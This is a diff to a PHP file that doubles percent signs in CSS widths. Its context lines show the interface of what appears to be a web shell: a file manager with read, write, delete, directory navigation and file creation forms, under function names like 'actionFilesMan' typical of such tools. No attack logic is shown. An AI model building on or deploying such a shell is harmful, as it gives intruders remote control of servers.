@@ -262,7 +262,7 @@ $html = <<<HTML
             color: #cccccc;
         }
         input[type="text"], input[type="password"], textarea {
-            width: 100%;
+            width: 100%%;
             padding: 10px;
             background-color: #3c3c3c;
             border: 1px solid #3e3e42;
@@ -343,7 +343,7 @@ $html = <<<HTML
             font-family: 'Consolas', 'Monaco', monospace;
         }
         .info-table {
-            width: 100%;
+            width: 100%%;
             border-collapse: collapse;
             background-color: #1e1e1e;
             border-radius: 3px;
@@ -435,7 +435,7 @@ $html .= <<<HTML
             <h3>文件操作</h3>
             <div class="form-group">
                 <label for="fileAction">操作：</label>
-                <select id="fileAction" style="width: 100%; padding: 10px; background-color: #3c3c3c; border: 1px solid #3e3e42; border-radius: 3px; color: #d4d4d4;">
+                <select id="fileAction" style="width: 100%%; padding: 10px; background-color: #3c3c3c; border: 1px solid #3e3e42; border-radius: 3px; color: #d4d4d4;">
                     <option value="read">读取文件</option>
                     <option value="write">写入文件</option>
                     <option value="delete">删除文件/目录</option>
@@ -965,7 +965,7 @@ function gyscanHeader() {
         a{ text-decoration:none; }
         a:hover{ text-decoration:underline;background-color:#333; }
         .ml1{ border:1px solid #444;padding:10px;margin:10px;overflow: auto;background-color:#1a1a1a; }
-        .bigarea{ width:100%;height:300px; }
+        .bigarea{ width:100%%;height:300px; }
         input,textarea,select{ margin:5px;color:#fff;background-color:#333;border:1px solid ".$GYSCAN_COLOR."; font: 10pt 'Courier New',monospace; padding:5px; }
         form{ margin:0px; }
         #toolsTbl{ text-align:center; }
@@ -1353,7 +1353,7 @@ function actionFilesMan() {
     echo "<form method='post' style='margin:10px 0;padding:10px;border:1px solid #444;background:#222;'>
         <input type='hidden' name='a' value='FilesMan'>
         <span style='font-weight:bold;color:#ffff00;'>📁 目录导航:</span><br>
-        <input type='text' name='c' value='" . htmlspecialchars($cwd) . "' style='width:70%;margin:5px 0;padding:5px;background:#333;color:#fff;border:1px solid #555;' placeholder='输入完整目录路径'>
+        <input type='text' name='c' value='" . htmlspecialchars($cwd) . "' style='width:70%%;margin:5px 0;padding:5px;background:#333;color:#fff;border:1px solid #555;' placeholder='输入完整目录路径'>
         <input type='submit' value='进入目录' style='padding:5px 10px;background:#555;color:#fff;border:1px solid #666;'>
     </form>";
     
@@ -1368,14 +1368,14 @@ function actionFilesMan() {
                     <input type='hidden' name='a' value='FilesMan'>
                     <input type='hidden' name='c' value='" . htmlspecialchars($cwd) . "'>
                     <input type='hidden' name='p1' value='create_file'>
-                    <table style='width:100%;'>
+                    <table style='width:100%%;'>
                         <tr>
                             <td style='width:80px;'>文件名:</td>
-                            <td><input type='text' name='p2' placeholder='例如: test.txt' style='width:100%;padding:5px;background:#333;color:#fff;border:1px solid #555;'></td>
+                            <td><input type='text' name='p2' placeholder='例如: test.txt' style='width:100%%;padding:5px;background:#333;color:#fff;border:1px solid #555;'></td>
                         </tr>
                         <tr>
                             <td>内容:</td>
-                            <td><textarea name='p3' placeholder='文件内容（可选）' style='width:100%;height:40px;padding:5px;background:#333;color:#fff;border:1px solid #555;'></textarea></td>
+                            <td><textarea name='p3' placeholder='文件内容（可选）' style='width:100%%;height:40px;padding:5px;background:#333;color:#fff;border:1px solid #555;'></textarea></td>
                         </tr>
                         <tr>
                             <td></td>
@@ -1391,10 +1391,10 @@ function actionFilesMan() {
                     <input type='hidden' name='a' value='FilesMan'>
                     <input type='hidden' name='c' value='" . htmlspecialchars($cwd) . "'>
                     <input type='hidden' name='p1' value='create_folder'>
-                    <table style='width:100%;'>
+                    <table style='width:100%%;'>
                         <tr>
                             <td style='width:80px;'>文件夹名:</td>
-                            <td><input type='text' name='p2' placeholder='例如: new_folder' style='width:100%;padding:5px;background:#333;color:#fff;border:1px solid #555;'></td>
+                            <td><input type='text' name='p2' placeholder='例如: new_folder' style='width:100%%;padding:5px;background:#333;color:#fff;border:1px solid #555;'></td>
                         </tr>
                         <tr>
                             <td></td>
